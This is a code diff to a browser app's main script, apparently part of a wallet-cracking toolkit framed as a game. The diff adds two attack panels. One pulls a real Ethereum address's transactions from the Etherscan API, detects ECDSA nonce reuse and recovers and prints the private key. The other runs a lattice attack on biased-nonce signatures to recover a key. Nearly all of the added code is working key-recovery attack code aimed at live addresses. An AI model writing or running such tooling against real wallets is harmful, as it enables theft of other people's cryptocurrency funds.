@@ -22,6 +22,11 @@ import { resetLibbitcoin, getLibbitcoinSeed } from './game/libbitcoin.js';
 import {
   loadCrosschainKeys, getCrosschainProgress, resetCrosschain, BUILTIN_CROSSCHAIN_KEYS,
 } from './game/crosschain.js';
+import {
+  findNonceReuse, recoverPrivKey, legacySigningHash, bytesToBigInt,
+  verifyPrivKey, bigIntToBytes32,
+} from './game/ecdsa-nonce.js';
+import { latticeAttack } from './game/lattice.js';
 
 const AUTOSPIN_DELAY_MS = 250;
 const AUTOSPIN_DELAY_NO_DELAY_MS = 16;
@@ -139,6 +144,8 @@ async function main() {
   const panelRandstorm  = document.getElementById('panel-randstorm');
   const panelLibbitcoin = document.getElementById('panel-libbitcoin');
   const panelCrosschain = document.getElementById('panel-crosschain');
+  const panelEcdsa      = document.getElementById('panel-ecdsa');
+  const panelLattice    = document.getElementById('panel-lattice');
 
   const allPanels = {
     random:    panelRandom,
@@ -149,6 +156,8 @@ async function main() {
     randstorm: panelRandstorm,
     libbitcoin: panelLibbitcoin,
     crosschain: panelCrosschain,
+    ecdsa:      panelEcdsa,
+    lattice:    panelLattice,
   };
 
   function setMode(mode) {
@@ -241,6 +250,161 @@ async function main() {
     } catch (err) {
       document.getElementById('cc-status').textContent = `Error: ${err.message}`;
     }
+  });
+
+  // ECDSA nonce-reuse analysis
+  function analysisLog(containerEl, message, kind = '') {
+    containerEl.hidden = false;
+    const line = document.createElement('div');
+    if (kind) line.className = `log-${kind}`;
+    line.textContent = message;
+    containerEl.appendChild(line);
+    containerEl.scrollTop = containerEl.scrollHeight;
+  }
+
+  document.getElementById('ecdsa-analyze').addEventListener('click', async () => {
+    const apiKey  = document.getElementById('ecdsa-apikey').value.trim();
+    const address = document.getElementById('ecdsa-address').value.trim();
+    const statusEl = document.getElementById('ecdsa-status');
+    const logEl    = document.getElementById('ecdsa-log');
+
+    if (!address) { statusEl.textContent = 'Enter an ETH address.'; return; }
+    logEl.innerHTML = '';
+    logEl.hidden = false;
+    statusEl.textContent = 'Fetching transactions…';
+
+    const key = apiKey || 'YourApiKeyToken';
+    const url = `https://api.etherscan.io/api?module=account&action=txlist`
+      + `&address=${address}&startblock=0&endblock=99999999`
+      + `&page=1&offset=10000&sort=asc&apikey=${key}`;
+
+    let txList;
+    try {
+      const resp = await fetch(url);
+      const json = await resp.json();
+      if (json.status !== '1') throw new Error(json.message || json.result);
+      txList = json.result.filter(tx => tx.from.toLowerCase() === address.toLowerCase());
+      analysisLog(logEl, `Fetched ${txList.length} outbound transactions.`);
+    } catch (err) {
+      statusEl.textContent = `Fetch error: ${err.message}`;
+      analysisLog(logEl, `Error: ${err.message}`, 'err');
+      return;
+    }
+
+    const collisions = findNonceReuse(txList);
+    analysisLog(logEl, `Checked r values — ${collisions.length} collision group(s) found.`);
+
+    if (collisions.length === 0) {
+      statusEl.textContent = 'No nonce reuse detected in this address.';
+      return;
+    }
+
+    for (const group of collisions) {
+      for (let i = 0; i < group.length - 1; i++) {
+        const tx1 = group[i], tx2 = group[i + 1];
+        analysisLog(logEl, `r collision: ${tx1.hash.slice(0, 12)}… and ${tx2.hash.slice(0, 12)}…`);
+
+        // Only handle legacy (type 0) txs — need RLP for signing hash
+        const type1 = tx1.txreceipt_status !== undefined ? (parseInt(tx1.type || '0', 16)) : 0;
+        const type2 = tx2.txreceipt_status !== undefined ? (parseInt(tx2.type || '0', 16)) : 0;
+        if (type1 !== 0 || type2 !== 0) {
+          analysisLog(logEl, 'Non-legacy transaction type — cannot compute signing hash via RLP.', 'err');
+          continue;
+        }
+
+        let h1Bytes, h2Bytes;
+        try {
+          h1Bytes = legacySigningHash(tx1);
+          h2Bytes = legacySigningHash(tx2);
+        } catch (e) {
+          analysisLog(logEl, `Signing hash error: ${e.message}`, 'err');
+          continue;
+        }
+
+        const h1 = bytesToBigInt(h1Bytes);
+        const h2 = bytesToBigInt(h2Bytes);
+        const r  = BigInt(tx1.r);
+        const s1 = BigInt(tx1.s);
+        const s2 = BigInt(tx2.s);
+
+        const privKeyBig = recoverPrivKey(r, s1, h1, s2, h2);
+        if (!privKeyBig) {
+          analysisLog(logEl, 'Key recovery returned null (identical signatures?).', 'err');
+          continue;
+        }
+
+        const verified = verifyPrivKey(privKeyBig, address);
+        if (verified) {
+          const privBytes = bigIntToBytes32(privKeyBig);
+          const privHex = Array.from(privBytes).map(b => b.toString(16).padStart(2, '0')).join('');
+          analysisLog(logEl, `KEY RECOVERED: 0x${privHex}`, 'ok');
+          statusEl.textContent = 'Private key recovered!';
+          const derived = deriveAll(privBytes);
+          winDialog.show({ privKey: privBytes, privKeyHex: privHex, derived, match: { addressBytes: derived.addressBytes } });
+        } else {
+          analysisLog(logEl, 'Recovery produced a candidate but address mismatch — try other sig pair.', 'err');
+        }
+      }
+    }
+
+    if (collisions.length > 0 && document.getElementById('ecdsa-log').children.length > 1) {
+      statusEl.textContent = 'Analysis complete. See log above.';
+    }
+  });
+
+  // Lattice attack
+  document.getElementById('lattice-run').addEventListener('click', () => {
+    const address  = document.getElementById('lattice-address').value.trim();
+    const biasRaw  = document.getElementById('lattice-bias').value.trim();
+    const sigsRaw  = document.getElementById('lattice-sigs').value.trim();
+    const statusEl = document.getElementById('lattice-status');
+    const logEl    = document.getElementById('lattice-log');
+
+    logEl.innerHTML = '';
+    logEl.hidden = false;
+
+    if (!address) { statusEl.textContent = 'Enter the ETH address to verify the key against.'; return; }
+    if (!sigsRaw) { statusEl.textContent = 'Paste a JSON array of signatures.'; return; }
+
+    let rawSigs;
+    try {
+      rawSigs = JSON.parse(sigsRaw);
+      if (!Array.isArray(rawSigs)) throw new Error('Expected a JSON array.');
+    } catch (e) {
+      statusEl.textContent = `JSON parse error: ${e.message}`;
+      return;
+    }
+
+    const sigs = rawSigs.map((s, i) => {
+      const hash = typeof s.hash === 'string' ? BigInt(s.hash) : BigInt(s.hash);
+      const r    = typeof s.r   === 'string' ? BigInt(s.r)    : BigInt(s.r);
+      const sv   = typeof s.s   === 'string' ? BigInt(s.s)    : BigInt(s.s);
+      return { hash, r, s: sv };
+    });
+
+    const bias = biasRaw ? parseInt(biasRaw, 10) : null;
+    analysisLog(logEl, `Running LLL on ${sigs.length} signature(s), bias=${bias ?? 'auto'}…`);
+    statusEl.textContent = 'Running… (this may take several seconds)';
+
+    // Run in a macrotask so the UI updates first
+    setTimeout(() => {
+      try {
+        const result = latticeAttack(sigs, address, bias);
+        if (result.error) {
+          analysisLog(logEl, result.error, 'err');
+          statusEl.textContent = 'No key found.';
+        } else {
+          const privHex = Array.from(result.privKeyBytes).map(b => b.toString(16).padStart(2, '0')).join('');
+          analysisLog(logEl, `KEY RECOVERED (bias=${result.biasBits}b, ${result.sigsUsed} sigs): 0x${privHex}`, 'ok');
+          statusEl.textContent = 'Private key recovered!';
+          const derived = deriveAll(result.privKeyBytes);
+          winDialog.show({ privKey: result.privKeyBytes, privKeyHex: privHex, derived, match: { addressBytes: derived.addressBytes } });
+        }
+      } catch (e) {
+        analysisLog(logEl, `Error: ${e.message}`, 'err');
+        statusEl.textContent = 'Error during lattice reduction.';
+      }
+    }, 0);
   });
 
   const log = new Log(document.getElementById('log'));
